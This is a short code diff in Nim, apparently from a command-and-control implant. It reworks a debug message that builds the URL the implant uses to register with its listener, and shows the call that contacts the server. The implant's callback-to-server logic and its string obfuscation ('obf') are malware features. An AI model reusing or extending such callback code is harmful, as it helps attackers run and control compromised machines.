@@ -277,9 +277,14 @@ proc init*(li: var Listener) : void =
     
     # Register with the server
     when defined verbose:
-        echo obf("DEBUG: Attempting to connect to ") & toLowerAscii(li.listenerType) & "://" & 
-             (if li.listenerHost != "": li.listenerHost else: li.implantCallbackIp & ":" & li.listenerPort) & 
-             li.registerPath
+        var registerUrl = ""
+        if li.listenerHost != "":
+            registerUrl = toLowerAscii(li.listenerType) & "://" & li.listenerHost & li.registerPath
+        elif li.implantCallbackIp.startsWith("http://") or li.implantCallbackIp.startsWith("https://"):
+            registerUrl = li.implantCallbackIp & li.registerPath
+        else:
+            registerUrl = toLowerAscii(li.listenerType) & "://" & li.implantCallbackIp & ":" & li.listenerPort & li.registerPath
+        echo obf("DEBUG: Attempting to connect to ") & registerUrl
 
     var res = doRequest(li, li.registerPath)
     
